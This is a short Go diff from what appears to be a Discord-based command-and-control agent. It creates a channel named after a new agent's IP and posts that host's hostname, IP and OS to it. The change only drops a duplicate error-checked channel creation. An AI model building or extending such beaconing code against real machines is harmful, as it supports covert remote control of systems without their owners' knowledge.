@@ -58,11 +58,6 @@ func main() {
 	}
 
 	channelID, _ = dg.GuildChannelCreate(util.ServerID, newAgent.IP, 0)
-	channelID, err := dg.GuildChannelCreate(util.ServerID, newAgent.IP, 0)
-	if err != nil {
-		fmt.Println("error creating channel:", err)
-		return
-	}
 
 	sendMessage := "``` Hostname: " + newAgent.HostName + "\n IP:" + newAgent.IP + "\n OS:" + newAgent.OS + "```"
 	message, _ := dg.ChannelMessageSend(channelID.ID, sendMessage)
